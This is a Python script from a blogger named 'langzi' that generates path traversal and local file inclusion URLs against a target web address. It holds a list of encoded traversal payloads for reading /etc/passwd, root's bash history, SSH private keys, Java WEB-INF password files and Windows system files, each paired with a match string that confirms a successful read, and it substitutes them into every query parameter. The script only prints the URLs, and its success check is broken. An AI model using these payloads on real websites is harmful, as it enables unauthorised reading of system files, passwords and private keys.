# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
from urllib.parse import urlparse,parse_qs,urlencode
import copy

payloads = {
    '../../../../../../../../../etc/hosts%00':'localhost localhost.localdomain',
    '../../etc/hosts%00':'localhost localhost.localdomain',
    '/etc/hosts':'localhost localhost.localdomain',
    '../../../../../../../../../etc/passwd%00':'root:x:',
    '../../../etc/pwd/././.[…]/././.':'root:x:',
    '/etc/passwd.txt/../../etc/passwd%00':'root:x:',
    '../../root/.bash_history':'cd ./usr/local/nginx',
    '../../root/.bash_history%00':'cat /etc/my.cnf ',
    '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00':'root:x:',
    'WEB-INF/password.xml':'viewfile/?contextpath=/',
    '../../ierp/bin/prop.xml':'sendStringParametersAsUnicode=',
    '/.ssh/id_dsa': 'PRIVATE KEY-',
    '../../../../../../ssh/id_dsa%00': 'PRIVATE KEY-',
    '/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd': 'root:x:',
    'C:/Windows/System32/drivers/etc/hosts': 'localhost localhost.localdomain',
    '/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini': '[mci extensions]'}

def Get_Paylpad(url):
    try:
        site = url
        finalurl = urlparse(site)
        domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
        # http://127.0.0.1/
        domain = domain0.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
        # 127.0.0.1
        o = urlparse(site)
        parameters = parse_qs(o.query, keep_blank_values=True)
        # {'url': ['i'], 'id': ['1']}
        path = urlparse(site).scheme + "://" + urlparse(site).netloc + urlparse(
            site).path
        # http://127.0.0.1/pik/vul/urlredirect/urlredirect.php

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'close',
            'Host': '{0}',
            'Referer': '{1}',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
        }
        headers = {k: v.format(domain,domain0) for k, v in headers.items()}
        paramvlue = {k:v[0] for k,v in parameters.items()}
        for payload in payloads:
            payload = payload.format(domain0)
            for k,v in paramvlue.items():
                paramvlues = copy.deepcopy(paramvlue)
                paramvlues[k] = payload
                dix = print(path+'?' + urlencode(paramvlues))
                print(payloads[payload])

                if dix:
                    return dix
    except Exception as e:
        print(e)
Get_Paylpad('http://www.langzi.fun/index.php?id=1&url=admin')